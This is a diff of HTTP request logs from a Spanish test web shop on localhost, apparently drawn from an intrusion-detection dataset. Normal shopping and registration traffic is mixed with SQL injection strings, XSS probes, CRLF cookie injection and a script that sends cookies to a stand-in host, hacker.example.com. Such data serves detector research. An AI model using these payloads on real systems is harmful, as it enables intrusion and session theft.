@@ -1,200 +1,100 @@
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=abdel-az&password=berberisco&nombre=Zaqueo&apellidos=Cabada+Ferrus&email=gentry.gast%40luchalibremexicana.cat&dni=43141809L&direccion=General+Bravo%2C+189%2C+&ciudad=Collado+Mediano&cp=31281&provincia=Salamanca&ntc=2840005774765443&B1=Registrar
+POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=kuntova&pwd=TROvA&remember=on%2B&B1=Entrar
+GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=3714&B1=Confirmar HTTP/1.1
+GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide HTTP/1.1
+GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
+POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=9366&B1=Pasar+por+caja
+GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Vino+Rioja&precioA=100&cantidad=21&B1=A%F1adir+al+carrito
+GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
+POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
 GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
 GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%4040
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modoA=entrar&login=vivianne7&pwd=adu3%F3n&remember=on&B1=Entrar
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
-GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1
-GET http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif HTTP/1.1
-GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
-GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&loginA=krowlek&pwd=veintidoseno&remember=off&B1=Entrar
-GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=damiano&password=EsCoGiDAMeNte&nombre=Vilmar&apellidos=Mateu+Bernaus&email=sheybal%40cirugiaparpado.no&dni=75586196P&direccion=Travesia+Nardo+124%2C+7E&ciudad=Torre+de%2F+Mi*guel+Sesmer%2Bo&cp=42311&provincia=C%E1ceres&ntc=6955835443751937&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=900&B1=Pasar+por+caja%27OR%27a%3D%27a HTTP/1.1
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chuanhsi&pwd=b129a97r&remember=on&B1=Entrar HTTP/1.1
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%2B
-GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=hyatt&password=8c75ps8s&nombre=Raimundo&apellidos=Trave+Girard&email=graef%40softwaremasservicio.is&dni=70803791Q&direccion=Carrer+N%BA++224+S%2FN%2C+3C&ciudad=Cervera+del+Maestre&cp=09390&provincia=Ciudad+Real&ntc=0093197595343977&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=mullinix&password=portadguero&nombre=Nanda&apellidos=Santagata+Pillajo&email=wakasa%40miami-beach.gf&dni=44636251J&direccion=C%2F+Perro+De+San+Cecilio%2C+197+11%3FA&ciudad=Cerro+de+And%E9valo%2C+El&cp=19275&provincia=Guadalaja%2Fra&ntc=5604259372572557&B1=Registrar
-GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
-POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1
-GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
-GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cash3&password=urpila&nombre=Jeanne&apellidosA=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=C%E1diz&ntc=1124103686450000&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7098&B1=Confirmar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=74&B1=A%F1adir+al+carrito HTTP/1.1
-GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=shari&pwd=AGobiadO&remember=on&B1=Entrar%27+DELETE+FROM+USERS
-GET http://localhost:8080/tienda1/global/creditos.jsp/6909030637832563290.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registrosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente+Batllori&email=kawazu3%40alquilerpantallasled.org&dni=79540644C&direccion=Cami%F1o+Dentagron+68%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=33909&provincia=Teruel&ntc=3393638948319901&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=53&B1=A%F1adir+al+carrito HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=mehlhaff&pwd=23m6%E9&remember=on&B1A=Entrar
-GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
-GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=3&nombre=Queso+Manchego&precio=39&cantidad=21&B1=A%F1adir+al+carrito
-POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=2
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
-GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=sameh&password=encara&nombre=Marcelino&apellidos=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=60B999025N&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsgA=Credenciales+incorrectas
-GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%2B HTTP/1.1
-GET http://localhost:8080/tienda1/publico/ HTTP/1.1
+GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
 GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
 GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Vino+Rioja&precio=39&cantidad=40&B1=A%F1adir+al+carrito HTTP/1.1
-GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide HTTP/1.1
 GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=85&B1=A%F1adir+al+carrito
-GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mariabel&password=c2645ido&nombre=Zelma&apellidos=Dotor+Fornell&email=celik-regan%40turinga.sb&dni=95113653M&direccion=Carrer+Jaume+D%27artes+78%2C+&ciudad=Osornillo&cp=10411&provincia=Burgos&ntc=3090147546194865&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
-GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hendren&password=veinten6o&nombre=N%E9stor&apellidos=Pont&email=burkley_mature%40lunch.com.jm&dni=43044777R&direccion=C%2F+Girona+S%2FN+&ciudad=Pola+de+Gord%F3n%2C+La&cp=23100bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&provincia=%C1vila&ntc=3553885634703680&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=709&B1A=Pasar+por+caja
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=joelly&password=r8cid0va&nombre=Flaviano&apellidos=Sarri%E0+Orbe&email=oshea_knowles%40tiaherminia.gh&dni=14977979B&direccion=Calle+Del+Llenguadoc+S%2FN%2C+6E&ciudad=Pujalt&cp=45183&provincia=Valencia&ntc=0269447503610316&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=d%3Frieka&password=se8i06c9l&nombre=Valiente&apellidos=Yomona+Noda&email=oberon%4023horas.kz&dni=73353905M&direccion=Calle+Assalt%2C+120+&ciudad=Aznalc%E1zar&cp=49120&provincia=Burgos&ntc=6920842539231486&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6264&B1=Confirmar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%2B HTTP/1.1
 GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=defalco&password=botonesSet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Suyai&apellidos=R%E1bago+Patraca&email=ghenaiem_berlin%40hipotecascom.je&dni=24778234N&direccion=C%2F+La+Salpa+104%2C+&ciudad=Moral+de+la+Reina&cp=10334&provincia=Burgos&ntc=5823821605242067&B1=Registrar HTTP/1.1
-PUT http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precio=85&cantidad=65&B1=A%F1adir+al+carrito
-GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precio=100&cantidadA=13&B1=A%F1adir+al+carrito
-GET http://localhost:8080/tienda1/publico/productos.jsp.Bak HTTP/1.1
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=williams9&pwd=LaSedaD&remember=on&B1=Entrar HTTP/1.1
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=32&B1=A%F1adir+al+carrito
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chi-yin&password=zAfIo&nombre=Amael&apellidos=Casselle+Cullell&email=vacey%40madrid2012.kw&dni=70541156H&direccion=Plza.+Agueda+Diez%2C+25+10%3FB&ciudad=Oria&cp=19415&provincia=Cantabria&ntc=%2520&B1=Registrar HTTP/1.1
-GET http://localhost:8080/iisstart.asp HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/index.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=houston&password=8n885rado&nombre=Salvino&apellidos=Ivanco+Casola&email=galli_amagula%40hotelesjerez.lc&dni=53532197L&direccion=Call%2Be+Gil+De+On*ta%F1on%2C+S*%2FN%2C+&ciudad=Artesa+de+Segre&cp=05571&provincia=Burgos&ntc=3983408909914725&B1=Registrar
-GET http://localhost:8080/tienda1/publico/asf-logo-wide HTTP/1.1
-GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/global/estilos.css.Bak HTTP/1.1
-GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&login=alexi&password=cUerdA&nombre=Donardo&apellidos=Paracoll&email=filho%40encuentrodominios.is&dni=01722111D&direccion=Enric+Granados+137%2C+&ciudad=Ruesca&cp=47248&provincia=Alicante&ntc=0825150389138142&B1=Registrar
-GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
-GET http://localhost:8080/samples/sampsite/sampsite.htm HTTP/1.1
-GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=81&B1=A%F1adir+al+carrito HTTP/1.1
-GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&loginA=carolyne&password=1%F35i7am41t0&nombre=Ram%F3n&apellidos=Chambueta+Deben&email=mangini%40cubiertoscbb.an&dni=10042805Q&direccion=Calle+Falconera%2C+173+&ciudad=Trefacio&cp=31227&provincia=Salamanca&ntc=1976494121699035&B1=Registrar
-GET http://localhost:8080/tienda1/publico/ HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide HTTP/1.1
-GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kwangchi&pwd=73spoJador&remember=off&B1=Entrar HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.bak HTTP/1.1
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=100&cantidad=91&B1A=A%F1adir+al+carrito
-GET http://localhost:8080.Old HTTP/1.1
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6471&B1=Pasar+por+caja%2F HTTP/1.1
-GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bohyun&pwd=1illabarqu%ED2&remember=on&B1=Entrar HTTP/1.1
-GET http://localhost:8080/webapp/examples/ping HTTP/1.1
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%27+DELETE+FROM+USERS
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pebrook&password=5ica7er1&nombre=Edgar&apellidos=Sumariva+Santamar%EDa&email=rosanova-angelo%40dissident.mm&dni=43646821C&direccion=Via+Complutense%2C+76%2C+&ciudadA=Miguelturra&cp=09390&provincia=Palencia&ntc=8153377554882034&B1=Registrar HTTP/1.1
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ailina&password=tel9m%E9trica&nombreA=Fernando&apellidos=Reiriz+Colom%E9&email=dugan%40onlinegratis.ls&dni=70144091W&direccion=Calle+Monte+Del+Taco+102+12%3FA&ciudad=San+Miguel+de+Bernuy&cp=08694&provincia=Almer%EDa&ntc=0887576262160780&B1=Registrar HTTP/1.1
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=grainger&password=dilecci%F3n&nombre=%3FBa%27bel-i&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cp=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar
-POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=280&B1=Pasar+por+caja
-GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
-POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=9366&B1=Pasar+por+caja
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=tomaszew&password=capillero&nombre=Robustiana&apellidos=Sabater+Esp%EDndola&email=leighton%40pedro-mu%F1oz.gs&dni=33035723H&direccion=C%2F+Transportes+70+&ciudad=B%E1rboles&cp=+&provincia=Palencia&ntc=6125129848113122&B1=Registrar
-GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
 GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=%27+AND+%271%27%3D%271&login=cinderel&password=rel%2Bigionario&nombre=Kenneth&apellidos=Hijodalgo+Formiga&email=gil-botelho%40miami-beach.com.info&dni=81551229Z&direccion=El+Arquero%2C+143%2C+1%3FD&ciudad=Amurrio&cp=37170&provincia=Segovia&ntc=8326601768414043&B1=Registrar
-GET http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide HTTP/1.1
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&loginA=ince&pwd=74oNc0&remember=on&B1=Entrar
-GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=velasque9&pwd=adversario&remember=on&B1=Entrar
-GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27+AND+%271%27%3D%271 HTTP/1.1
-GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=willie51&password=desintegrar&nombre=Cirio&apellidos=Junquera&email=desailly_bosworth%40coworkers.gov&dni=33273113W&direccion=Calle+Lujan+Perez+17%2C+&ciudad=Undu%E9s+de+Lerda&cp=45130&provincia=Valladolid&ntc=4102716313272060&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
-GET http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
-GET http://localhost:8080/iissamples/ExAir/FunNGames/FunNGames.asp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=underwoo&password=desportilladura&nombre=Alide&apellidos=Ezama+Ogaz&email=quan%40arroyo-molinos.ee&dni=52948186R&direccion=El+Naranjo%2C+S%2FN+5F&ciudad=Eliana%2C+l%27&cp=34112&provincia=Le%F3n&ntc=5244748375620408&B1=Registrar
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=schwenk&password=iNfINitIvO&nombre=Tarciano%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Varela+Pulido&email=strizhenova-boston%40hrmsl.kh&dni=36249511Q&direccion=Barrio+Vidal+132%2C+13%3FB&ciudad=Rubite&cp=50160&provincia=Zamora&ntc=6295032148467406&B1=Registrar
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oskorep&pwd=abU%D1uelAdA&remember=on&B1=Entrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mariabel&password=c2645ido&nombre=Zelma&apellidos=Dotor+Fornell&email=celik-regan%40turinga.sb&dni=95113653M&direccion=Carrer+Jaume+D%27artes+78%2C+&ciudad=Osornillo&cp=10411&provincia=Burgos&ntc=3090147546194865&B1=Registrar HTTP/1.1
 POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=keeler&password=g78e651no&nombre=Floro&apellidos=Fidalgo&email=mcintosh%40pavimentosalagon.gy&dni=55170412J&direccion=C%2F+Joaquin+Sorolla%2C+148+5%3FD&ciudad=Aben%F3jar&cp=47175&provincia=Salamanca&ntc=240796981547256A&B1=Registrar
+POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=schwenk&password=iNfINitIvO&nombre=Tarciano%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Varela+Pulido&email=strizhenova-boston%40hrmsl.kh&dni=36249511Q&direccion=Barrio+Vidal+132%2C+13%3FB&ciudad=Rubite&cp=50160&provincia=Zamora&ntc=6295032148467406&B1=Registrar
+GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=williams9&pwd=LaSedaD&remember=on&B1=Entrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hendren&password=veinten6o&nombre=N%E9stor&apellidos=Pont&email=burkley_mature%40lunch.com.jm&dni=43044777R&direccion=C%2F+Girona+S%2FN+&ciudad=Pola+de+Gord%F3n%2C+La&cp=23100bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&provincia=%C1vila&ntc=3553885634703680&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
+GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
+POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%27+DELETE+FROM+USERS
+GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=3&nombre=Queso+Manchego&precio=39&cantidad=21&B1=A%F1adir+al+carrito
+GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
+POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=shari&pwd=AGobiadO&remember=on&B1=Entrar%27+DELETE+FROM+USERS
+GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
+GET http://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp HTTP/1.1
 GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=kuntova&pwd=TROvA&remember=on%2B&B1=Entrar
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=c6r5FOL4o&nombre=Gilbr%E1n&apellidos=Villalobos+Busoms&email=gounaris-ressel%40bru%F1oseguridad.je&dni=94798155K&direccion=Carretera+Platja+Llarga+120%2C+1%3FC&ciudad=Casas+de+Ves&cp=33820&provincia=Cantabria&ntc=4169442426229834&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif HTTP/1.1
-POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=7495&B1=Pasar+por+caja%2F
+GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
+GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
 POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=sosa&pwd=FraCcIoNArIo&remember=on&B1=Entrar
-GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
 GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=52&B1=A%F1adir+al+carrito HTTP/1.1
 GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
-GET http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1
-GET http://localhost:8080/tienda1/index.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5698&B1=Pasar+por+caja HTTP/1.1
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jamin&pwd=d%27eslig%2Cadura&remember=off&B1=Entrar HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
-GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
-GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar HTTP/1.1
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=100&cantidad=91&B1A=A%F1adir+al+carrito
+GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
 GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
+GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
+GET http://localhost:8080/webapp/examples/ping HTTP/1.1
+GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
+GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
+GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oskorep&pwd=abU%D1uelAdA&remember=on&B1=Entrar HTTP/1.1
 GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=racette&password=j804n86O&nombre=Gino&apellidos=Puy&email=borgeaud%40enmenorca.com.om&dni=52984297W&direccion=Jabeque%2C+86%2C+&ciudad=Relleu&cp=45810&provincia=%C1vila&ntc=9280522239849881&B1=Registrar
-POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%253F
-POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar
